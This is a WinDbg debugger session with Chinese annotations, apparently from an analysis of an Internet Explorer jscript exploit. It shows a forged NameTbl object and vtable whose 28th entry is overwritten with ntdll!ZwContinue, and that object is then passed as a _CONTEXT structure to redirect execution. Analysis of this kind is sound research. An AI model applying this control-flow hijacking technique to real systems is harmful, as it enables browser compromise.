    0:013> ub 000007fe`f00eaf86 
    jscript!CScriptRuntime::TypeOf+0x1916d: 
    000007fe`f00eaf65 e96c6ffeff      jmp     jscript!CScriptRuntime::TypeOf+0xde (000007fe`f00d1ed6) 
    000007fe`f00eaf6a 488b7f08        mov     rdi,qword ptr [rdi+8] 
    000007fe`f00eaf6e 488b07          mov     rax,qword ptr [rdi] 
    000007fe`f00eaf71 488b9838010000  mov     rbx,qword ptr [rax+138h] 
    000007fe`f00eaf78 488bcb          mov     rcx,rbx 
    000007fe`f00eaf7b ff15df260700    call    qword ptr [jscript!_guard_check_icall_fptr (000007fe`f015d660)] 
    000007fe`f00eaf81 488bcf          mov     rcx,rdi 
    000007fe`f00eaf84 ffd3            call    rbx ; ntdll!ZwContinue 由此处调用 
    // 执行流切换时的调用栈 
    0:013> k 
    Child-SP          RetAddr           Call Site 
    00000000`05388778 000007fe`f00eaf86 ntdll!ZwContinue 
    00000000`05388780 000007fe`f00d1ddb jscript!CScriptRuntime::TypeOf+0x1918e 
    00000000`053887f0 000007fe`f00a8ec2 jscript!CScriptRuntime::Run+0x3c88 
    00000000`053895f0 000007fe`f00a94b3 jscript!ScrFncObj::CallWithFrameOnStack+0x162 
    00000000`05389800 000007fe`f00a86ea jscript!NameTbl::InvokeInternal+0x2d3 
    00000000`05389920 000007fe`f00a24b8 jscript!VARIANT::InvokeByDispID+0xffffffff`ffffffea 
    00000000`05389970 000007fe`f00a8ec2 jscript!CScriptRuntime::Run+0x5a6 
    00000000`0538a770 000007fe`f00a94b3 jscript!ScrFncObj::CallWithFrameOnStack+0x162 
    00000000`0538a980 000007fe`f00a86ea jscript!NameTbl::InvokeInternal+0x2d3 
    00000000`0538aaa0 000007fe`f00a24b8 jscript!VARIANT::InvokeByDispID+0xffffffff`ffffffea 
    00000000`0538aaf0 000007fe`f00a8ec2 jscript!CScriptRuntime::Run+0x5a6 
    00000000`0538b8f0 000007fe`f00a8d2b jscript!ScrFncObj::CallWithFrameOnStack+0x162 
    00000000`0538bb00 000007fe`f00a8b95 jscript!ScrFncObj::Call+0xb7 
    00000000`0538bba0 000007fe`f00ae640 jscript!CSession::Execute+0x19e 
    00000000`0538bc70 000007fe`f00b70e7 jscript!COleScript::ExecutePendingScripts+0x17a 
    00000000`0538bd40 000007fe`f00b68e6 jscript!COleScript::ParseScriptTextCore+0x267 
    00000000`0538be30 000007fe`ec4a9d41 jscript!COleScript::ParseScriptText+0x56 
    00000000`0538be90 000007fe`ec4a97e2 MSHTML!CActiveScriptHolder::ParseScriptText+0xc1 
    00000000`0538bf10 000007fe`ec4aa8e5 MSHTML!CScriptCollection::ParseScriptText+0x27a 
    00000000`0538bff0 000007fe`ec4aa457 MSHTML!CScriptData::CommitCode+0x395 
    00000000`0538c1c0 000007fe`ec4aa1ed MSHTML!CScriptData::Execute+0x24b 
    00000000`0538c280 000007fe`ec22dc19 MSHTML!CHtmScriptParseCtx::Execute+0xe9 
    00000000`0538c2b0 000007fe`ec831419 MSHTML!CHtmParseBase::Execute+0x1dd 
    00000000`0538c3a0 000007fe`ec35114f MSHTML!CHtmPost::Exec+0x555 
    00000000`0538c5b0 000007fe`ec351098 MSHTML!CHtmPost::Run+0x3f 
    00000000`0538c5e0 000007fe`ec352387 MSHTML!PostManExecute+0x70 
    00000000`0538c660 000007fe`ec354ea3 MSHTML!PostManResume+0xa1 
    00000000`0538c6a0 000007fe`ec212dc7 MSHTML!CHtmPost::OnDwnChanCallback+0x43 
    00000000`0538c6f0 000007fe`ecad481e MSHTML!CDwnChan::OnMethodCall+0x41 
    00000000`0538c720 000007fe`ec15bdd8 MSHTML!GlobalWndOnMethodCall+0x219 
    00000000`0538c7c0 00000000`76ab9bd1 MSHTML!GlobalWndProc+0x24c 
    00000000`0538c840 00000000`76ab98da USER32!UserCallWinProcCheckWow+0x1ad 
    00000000`0538c900 000007fe`f10eee57 USER32!DispatchMessageWorker+0x3b5 
    00000000`0538c980 000007fe`f10f1d8b IEFRAME!CTabWindow::_TabWindowThreadProc+0x64c 
    00000000`0538fc00 000007fe`fd4cfbaf IEFRAME!LCIETab_ThreadProc+0x3a3 
    00000000`0538fd30 000007fe`f38961af iertutil!_IsoThreadProc_WrapperToReleaseScope+0x1f 
    00000000`0538fd60 00000000`76bb652d IEShims!NS_CreateThread::DesktopIE_ThreadProc+0x9f 
    00000000`0538fdb0 00000000`76cec541 kernel32!BaseThreadInitThunk+0xd 
    00000000`0538fde0 00000000`00000000 ntdll!RtlUserThreadStart+0x1d 
    // 伪造的jscript!NameTbl对象 
    0:013> dq 075c0a70 l68/8 
    00000000`075c0a70  00000000`056ced98 00000000`00000000 
    00000000`075c0a80  00000000`00000000 00000000`00000000 
    00000000`075c0a90  00000000`00000000 00000000`00000000 
    00000000`075c0aa0  00000000`00100003 00000000`00000033 
    00000000`075c0ab0  00000246`002b0000 00000000`00000000 
    00000000`075c0ac0  00000000`00000000 00000000`00000000 
    00000000`075c0ad0  00000000`00000000 
    // 伪造的jscript!NameTbl虚表 
    0:011> dps 00000000`056ced98 l40 
    00000000`056ced98  00410041`00410041 
    00000000`056ceda0  00410041`00410041 
    00000000`056ceda8  00410041`00410041 
    00000000`056cedb0  00410041`00410041 
    00000000`056cedb8  00410041`00410041 
    00000000`056cedc0  00410041`00410041 
    00000000`056cedc8  00410041`00410041 
    00000000`056cedd0  00410041`00410041 
    00000000`056cedd8  00410041`00410041 
    00000000`056cede0  00410041`00410041 
    00000000`056cede8  00410041`00410041 
    00000000`056cedf0  00410041`00410041 
    00000000`056cedf8  00410041`00410041 
    00000000`056cee00  00410041`00410041 
    00000000`056cee08  00410041`00410041 
    00000000`056cee10  00410041`00410041 
    00000000`056cee18  00410041`00410041 
    00000000`056cee20  00410041`00410041 
    00000000`056cee28  00410041`00410041 
    00000000`056cee30  00410041`00410041 
    00000000`056cee38  00410041`00410041 
    00000000`056cee40  00410041`00410041 
    00000000`056cee48  00410041`00410041 
    00000000`056cee50  00410041`00410041 
    00000000`056cee58  00410041`00410041 
    00000000`056cee60  00410041`00410041 
    00000000`056cee68  00410041`00410041 
    00000000`056cee70  00410041`00410041 
    00000000`056cee78  00410041`00410041 
    00000000`056cee80  00410041`00410041 
    00000000`056cee88  00410041`00410041 
    00000000`056cee90  00410041`00410041 
    00000000`056cee98  00410041`00410041 
    00000000`056ceea0  00410041`00410041 
    00000000`056ceea8  00410041`00410041 
    00000000`056ceeb0  00410041`00410041 
    00000000`056ceeb8  00410041`00410041 
    00000000`056ceec0  00410041`00410041 
    00000000`056ceec8  00410041`00410041 
    00000000`056ceed0  00000000`76d116e0 ntdll!ZwContinue // 虚表第 28 项被改写为 ntdll!ZwContinue，此处原先为 jscript!ObjEvtHandler::FPersist 函数地址 
    ... 
    // 直接将一个伪造的jscript!NameTbl对象当做_CONTEXT结构体，放入rcx寄存器进行传参 
    0:013> dt _CONTEXT 00000000`075c0a70 
    ntdll!_CONTEXT 
       +0x000 P1Home           : 0x56ced98 
       +0x008 P2Home           : 0 
       +0x010 P3Home           : 0 
       +0x018 P4Home           : 0 
       +0x020 P5Home           : 0 
       +0x028 P6Home           : 0 
       +0x030 ContextFlags     : 0x100003 
       +0x034 MxCsr            : 0 
       +0x038 SegCs            : 0x33 
       +0x03a SegDs            : 0 
       +0x03c SegEs            : 0 
       +0x03e SegFs            : 0 
       +0x040 SegGs            : 0 
       +0x042 SegSs            : 0x2b 
       +0x044 EFlags           : 0x246 
       +0x048 Dr0              : 0 
       +0x050 Dr1              : 0 
       +0x058 Dr2              : 0 
       +0x060 Dr3              : 0 
       +0x068 Dr6              : 0 
       +0x070 Dr7              : 0 
       +0x078 Rax              : 0 
       +0x080 Rcx              : 0x39e9c4 
       +0x088 Rdx              : 0 
       +0x090 Rbx              : 0 
       +0x098 Rsp              : 0x53884e0 
       +0x0a0 Rbp              : 0 
       +0x0a8 Rsi              : 0 
       +0x0b0 Rdi              : 0 
       +0x0b8 R8               : 0x40 
       +0x0c0 R9               : 0 
       +0x0c8 R10              : 0 
       +0x0d0 R11              : 0 
       +0x0d8 R12              : 0 
       +0x0e0 R13              : 0 
       +0x0e8 R14              : 0 
       +0x0f0 R15              : 0 
       +0x0f8 Rip              : 0x76c38d50 
       +0x100 FltSave          : _XSAVE_FORMAT 